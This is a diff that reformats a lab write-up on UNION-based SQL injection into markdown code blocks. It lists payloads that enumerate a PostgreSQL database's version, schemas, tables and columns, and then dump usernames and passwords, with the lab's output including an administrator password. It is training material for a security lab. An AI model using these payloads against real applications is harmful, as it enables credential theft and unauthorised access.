@@ -13,47 +13,75 @@ To solve the lab, log in as the administrator user.
 
 1/ Determine the number of columns
 
+```sql
 ' UNION SELECT NULL--
 ' UNION SELECT NULL, NULL--
+```
 
 
 2/ Determine the data type of columns
 
+```sql
 ' UNION SELECT 'AAA', 'AAA'--
+```
 
 
 3/ Determine the type and version of the database
 
+```sql
 ' UNION SELECT NULL, version()--
-		PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4)
+```
+
+```text
+PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4)
+```
 
 
 4/ Determine the schema names in the database
 
+```sql
 ' UNION SELECT NULL, schema_name FROM information_schema.schemata--
-		pg_catalog
-		public
-		information_schema
+```
 
+```text
+pg_catalog
+public
+information_schema
+```
 
 5/ Determine the table names in the database
 
+```sql
 ' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema='public'--
-		users_asobbt
-		products
+```
+
+```text
+users_asobbt
+products
+```
 
 
 6/ Determine the column names in the database
 
+```sql
 ' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users_asobbt'--
-		username_tdfarj
-		password_blgfiu
-		email
+```
+
+```text
+username_tdfarj
+password_blgfiu
+email
+```
 
 
 7/ Determine the data
 
+```sql
 ' UNION SELECT username_tdfarj, password_blgfiu FROM users_asobbt--
-		administrator
-		z8783l3xmggl9kek11yl
+```
+
+```text
+administrator
+z8783l3xmggl9kek11yl
+```
 
